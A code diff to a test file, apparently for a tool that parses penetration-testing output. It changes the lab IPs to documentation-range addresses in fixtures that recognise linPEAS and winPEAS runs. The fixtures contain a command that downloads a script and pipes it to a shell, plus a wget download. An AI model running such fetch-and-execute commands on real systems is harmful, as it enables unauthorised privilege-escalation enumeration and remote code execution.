@@ -5,7 +5,7 @@ import linpeasAnsi from '../../fixtures/interpret/linpeas-ansi.txt?raw'
 import winpeasPlain from '../../fixtures/interpret/winpeas-plain.txt?raw'
 
 const ranOn = { ranOn: true as const }
-const LIN_CMD = 'curl -L http://10.10.14.1/linpeas.sh | sh'
+const LIN_CMD = 'curl -L http://192.0.2.1/linpeas.sh | sh'
 const WIN_CMD = 'C:\\Windows\\Temp\\winPEASx64.exe'
 const titles = (vs: { title: string }[]) => vs.map((v) => v.title)
 
@@ -70,7 +70,7 @@ describe('PEAS', () => {
   })
 
   it('a download of the script is not a PEAS run', () => {
-    const r = interpret({ command: 'wget http://10.10.14.7/linpeas.sh', output: "Saving to: 'linpeas.sh'\n\nlinpeas.sh 100%[===>] 800K in 0.1s\n" })
+    const r = interpret({ command: 'wget http://192.0.2.7/linpeas.sh', output: "Saving to: 'linpeas.sh'\n\nlinpeas.sh 100%[===>] 800K in 0.1s\n" })
     expect(r.parsers).not.toContain('peas')
     expect(r.ticks).toEqual([])
     expect(r.vectors).toEqual([])
